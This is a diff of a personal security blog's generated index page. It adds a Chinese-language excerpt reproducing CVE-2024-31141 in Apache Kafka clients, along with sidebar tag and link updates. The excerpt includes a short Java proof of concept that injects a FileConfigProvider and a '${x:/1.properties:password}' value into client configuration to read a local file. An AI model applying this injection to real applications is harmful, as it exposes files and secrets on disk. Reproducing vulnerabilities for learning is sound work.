@@ -139,6 +139,41 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/12/08/Apache Kafka CVE-2024-31141学习/" title="CVE-2024-31141 Apache Kafka Clients：Privilege escalation to filesystem read-access via automatic ConfigProvider">Apache Kafka CVE-2024-31141学习</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-12-08  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://advisories.gitlab.com/pkg/maven/org.apache.kafka/kafka-clients/CVE-2024-31141/">CVE-2024-31141: Apache Kafka Clients: Privilege escalation to filesystem read-access via automatic ConfigProvider</a></p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p><font style="color:rgb(55, 65, 81);">Apache Kafka 客户端接受配置数据以自定义行为，并包含 ConfigProvider 插件以操作这些配置。 Apache Kafka 还提供 FileConfigProvider、DirectoryConfigProvider 和 EnvVarConfigProvider 实现，其中包括从磁盘或环境变量读取的功能。在 Apache Kafka 客户端配置可以由不受信任方指定的应用程序中，攻击者可以使用这些 ConfigProvider 读取磁盘和环境变量的任意内容。</font></p>
+<p><font style="color:rgb(55, 65, 81);">此问题影响 Apache Kafka 客户端：从 2.3.0 到 3.5.2、3.6.2、3.7.0。</font></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>根目录下创建1.properties文件</p>
+<p><img src="https://s2.loli.net/2024/12/08/5kJXZ3oTtfNCcE2.png"></p>
+<p>然后配置客户端连接的配置项，在真实场景下存在于kafka客户端可控自定义配置的场景</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.FileConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, FileConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x:/1.properties:password&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/08/E58nRBJ9dDjKSFg.png"></p>
+	
+	</div>
+  <a type="button" href="/2024/12/08/Apache Kafka CVE-2024-31141学习/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/12/06/fastjson1.2.80 in Springtboot新链学习/" title="fastjson1.2.80 in Springtboot">fastjson1.2.80 in Springtboot新链学习</a>
 		</h3>
 		</div>
@@ -238,6 +273,8 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
+			<li><a href="/categories/cve/">cve<span>1</span></a></li>
+		
 			<li><a href="/categories/environment/">environment<span>1</span></a></li>
 		
 			<li><a href="/categories/java/">java<span>1</span></a></li>
@@ -251,11 +288,13 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/security/">security<span>1</span></a></li>
+			<li><a href="/tags/kafka/">kafka<span>1</span></a></li>
 		
-			<li><a href="/tags/hexo/">hexo<span>1</span></a></li>
+			<li><a href="/tags/security/">security<span>2</span></a></li>
 		
 			<li><a href="/tags/fastjson/">fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/hexo/">hexo<span>1</span></a></li>
 		
 			<li><a href="/tags/environment/">environment<span>1</span></a></li>
 		
@@ -269,6 +308,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/12/08/Apache Kafka CVE-2024-31141学习/"  title="CVE-2024-31141 Apache Kafka Clients：Privilege escalation to filesystem read-access via automatic ConfigProvider" ><i class="fa fa-file-o"></i>Apache Kafka CVE-2024-31141学习</a>
+      </li>
     
       <li>
         <a href="/2024/12/06/fastjson1.2.80 in Springtboot新链学习/"  title="fastjson1.2.80 in Springtboot" ><i class="fa fa-file-o"></i>fastjson1.2.80 in Springtbo...</a>
@@ -287,9 +330,11 @@
 	<h4>Links</h4>
 	<ul class="blogroll list-unstyled">
 	
-		<li><i class="fa fa-drivers-license"></i><a href="http://blog.187.ink/" title="大哥带我" target="_blank"]);">L1mbo</a></li>
+		<li><i class="fa fa-user-o"></i><a href="http://blog.187.ink/" title="大哥带我" target="_blank"]);">L1mbo</a></li>
 	
-		<li><i class="fa fa-drivers-license"></i><a href="mailto:ph0ebus@qq.com" title="hello world" target="_blank"]);">好友位招租（</a></li>
+		<li><i class="fa fa-user-o"></i><a href="https://www.dkdun.cn/" title="领先的云服务商，赞赞赞" target="_blank"]);">DK盾 | 林枫云</a></li>
+	
+		<li><i class="fa fa-user-o"></i><a href="mailto:ph0ebus@qq.com" title="hello world" target="_blank"]);">好友位招租（</a></li>
 	
 	</ul>
 </div>
